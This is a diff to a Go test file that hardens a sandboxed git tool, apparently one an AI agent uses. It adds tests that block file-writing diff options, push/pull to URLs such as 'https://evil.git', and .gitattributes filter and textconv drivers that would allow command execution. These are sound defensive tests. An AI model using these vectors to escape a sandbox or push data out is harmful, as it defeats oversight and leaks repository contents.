@@ -53,12 +53,67 @@ func TestGit_DeniesFileWritingOptions(t *testing.T) {
 		t.Skipf("git not available: %v", err)
 	}
 	git := GitTool(dir, 0)
-	cases := []string{"--output=/tmp/x", "-O/tmp/x", "--ext-diff"}
+	cases := []string{"--output=/tmp/x", "-O/tmp/x", "--ext-diff", "--no-index", "-F/tmp/secret"}
 	for _, opt := range cases {
 		res := git.Call(context.Background(), `{"subcommand":"diff","args":"`+opt+`"}`)
 		if !res.IsError || !strings.Contains(res.Output, "blocked") {
 			t.Errorf("diff %q should be blocked, got: %s", opt, res.Output)
 		}
+	}
+}
+
+// push/pull with a positional repository URL is the exfiltration channel left after .git/config writes
+// were blocked; refspecs only (first non-option positional must not look like a URL or absolute path).
+func TestGit_PushPullURLPositionalRejected(t *testing.T) {
+	dir := t.TempDir()
+	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
+		t.Skipf("git not available: %v", err)
+	}
+	git := GitTool(dir, 0)
+	for _, sub := range []string{"push", "pull"} {
+		for _, args := range []string{"https://evil.git main", "/tmp/other-repo main", "file:///x main"} {
+			res := git.Call(context.Background(), `{"subcommand":"`+sub+`","args":"`+args+`"}`)
+			if !res.IsError || !strings.Contains(res.Output, "refspec") {
+				t.Errorf("git %s %q should be rejected, got: %s", sub, args, res.Output)
+			}
+		}
+		// Refspec-only forms pass the URL check (they may fail later at git-run for other reasons — no remote etc.).
+		res := git.Call(context.Background(), `{"subcommand":"`+sub+`","args":"origin main"}`)
+		if res.IsError && strings.Contains(res.Output, "not a refspec") {
+			t.Errorf("git %s origin main should not hit the URL check: %s", sub, res.Output)
+		}
+	}
+}
+
+// A workdir-writable .gitattributes with filter/textconv/diff drivers turns add/diff into arbitrary
+// command execution without touching .git — rejected before any git subcommand runs.
+func TestGit_GitAttributesDriverRejected(t *testing.T) {
+	dir := t.TempDir()
+	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
+		t.Skipf("git not available: %v", err)
+	}
+	git := GitTool(dir, 0)
+	for _, attrs := range []string{
+		"*.txt filter=xclean",      // filter.<x> via attribute shorthand — any filter. token
+		"* filter=xt",              // filter attribute (clean/smudge driver key)
+		"*.bin diff=hex",           // external diff driver
+		"*.c textconv=bin/hexdump", // textconv
+	} {
+		if err := os.WriteFile(filepath.Join(dir, ".gitattributes"), []byte(attrs), 0o600); err != nil {
+			t.Fatal(err)
+		}
+		res := git.Call(context.Background(), `{"subcommand":"diff"}`)
+		if !res.IsError || !strings.Contains(res.Output, ".gitattributes") {
+			t.Errorf("attrs %q should be rejected, got: %s", attrs, res.Output)
+		}
+	}
+	// Benign attributes (no driver) pass the check.
+	if err := os.WriteFile(filepath.Join(dir, ".gitattributes"), []byte("*.txt text\n*.go linguist-generated"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	res := git.Call(context.Background(), `{"subcommand":"status"}`)
+	if res.IsError {
+		t.Errorf("benign .gitattributes should pass: %s", res.Output)
 	}
 }
 
